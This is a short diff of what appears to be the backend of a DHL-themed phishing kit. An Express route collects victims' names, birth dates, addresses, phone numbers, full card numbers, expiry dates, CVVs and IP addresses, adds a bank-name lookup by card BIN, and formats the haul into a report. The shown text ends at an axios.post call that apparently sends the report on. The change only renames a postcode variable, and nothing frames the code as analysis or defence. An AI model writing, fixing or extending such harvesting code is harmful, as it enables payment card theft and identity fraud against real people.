@@ -59,7 +59,7 @@ app.post('/masonDHL', (req, res) => {
             bankName = resp.data.bank.name;
         }
     }).then(function () {
-        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
+        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (mason == 6) {
             axios.post(
